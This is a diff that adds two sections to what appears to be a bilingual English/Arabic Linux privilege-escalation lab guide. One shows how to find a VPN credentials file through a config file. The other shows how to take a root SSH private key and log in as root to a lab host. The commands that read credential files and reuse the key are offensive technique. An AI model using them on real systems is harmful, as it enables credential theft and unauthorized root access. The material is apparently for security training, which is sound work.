@@ -642,10 +642,56 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 * <details>
      <summary>Config Files</summary>
+
+    # Passwords & Keys - Config Files
+
+    ### 14) Passwords & keys - Config files
+
+    * إستغلال وإعدادات الـ `Config files` التي تحتوي على ملفات حساسة.
+
+    * Check a configuration file:
+        ```bash
+        cat /home/user/.myvpn.oven
+        ```
+        * The output might reference another file containing credentials: `auth-user-pass /etc/openvpn/auth.txt`
+        * (وجدنا هذا المسار)
+
+    * Read the file containing the credentials:
+        ```bash
+        cat /etc/openvpn/auth.txt
+        ```
+        * The output could be the username and password:
+        ```
+        root
+        Password123
+        ```
+        * (مبروك عليك اليوزر والباسورد)
+
   </details>
 
 * <details>
      <summary>SSH Keyss</summary>
+
+   # Passwords & Keys - SSH Keys
+
+   ### 15) Passwords & keys - SSH keys
+
+   * `ls -la`
+       * We found the `.ssh` directory.
+
+   * `ls -l .ssh`
+       * Inside, we find a private key, for example: `root_key`
+       * (وجدنا الـ private key الخاص بالـ `root`. سنقوم بنقله على جهازنا الـ `kali` الخاص بنا داخل ملف `root-key`)
+
+   * `chmod 600 root_key`
+       * (هذا لجعل المفتاح مقروء فقط من قبل المستخدم الحالي مما يمنع `ssh` رفضه)
+
+   * `ssh -i root_key root@10.10.19.152`
+       * This logs you in as root.
+       * `root#`
+       * (مبروك عليك)
+
+
   </details>
   
 </details>
